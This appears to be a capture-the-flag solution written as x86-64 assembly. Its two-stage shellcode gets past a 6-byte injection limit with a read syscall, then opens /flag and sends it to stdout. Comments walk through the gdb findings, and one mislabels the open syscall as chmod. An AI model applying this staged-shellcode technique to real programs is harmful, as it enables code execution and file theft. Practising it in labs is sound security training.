.global _start
_start:
.intel_syntax noprefix
# Theory:
# 		The challenge only allows us to inject 6 bytes of shellcode initially.
# 		We have to find and use vlaues within the programs register and memory,
# 		that we can use for our syscall(s). Using preset values allows us to save
# 		some instructions. Inspecting the challenge using gdb, we can see that
# 		RAX is set to zero and RDX contains the address our initial shellcode is
# 		placed by the challenge. Gdb also shows, that the address our shellcode is
# 		loaded to is not randomized. Also its value is small and big enough
# 		to be used as size value for a read systemcall. We can craft this read call
# 		as seen in stage1. We use this read to read our second stage shellcode at
# 		the same address our first stage shellcode was placed at by the challenge.
# 		Since we control the process of doing so, we skip the challenges 6 byte
# 		instruction check. In the second stage shellcode we have to pad the first 6
# 		bytes since the read syscalls return address points to the instruction directly
# 		after the stage 1 syscall.

stage1:
	# set up read fd to stdin
	push rax	# rax already set to 0 by challenge
	pop rdi
	# set up buffer mem addres to overwrite our current code such that exec continues stage2
	push rdx
	pop rsi
	# size of 0x2a26e000 already set up in rdx
	# syscall number 0 already set up in rax
	syscall

stage2:
	# pad first 6 bytes with nop to ensure exec starts after stage 1 syscall instruction
	.rept 6
	nop
	.endr

	# set up file name buffer on stack
	mov rdi, 0x00000067616c662f		# /flag in little endian is galf/
	push rdi
	mov rdi, rsp
	# set up open flags
	push 0
	pop rsi
	# set up syscall number
	push 2
	pop rax					# sys_chmod
	syscall

	# set up target fd
	push 1
	pop rdi					# stdout
	# set up source fd
	push rax
	pop rsi					# open flag file fd returned in rax
	# set up offset
	push 0
	pop rdx
	# set up number of bytes to transfer
	push 1000
	pop r10
	# set up syscall number
	push 40
	pop rax					# sendfile
	syscall

	# set up exit code
	push 0x00
	pop rdi
	# set up syscall number
	push 60
	pop rax					# sys_exit
	syscall
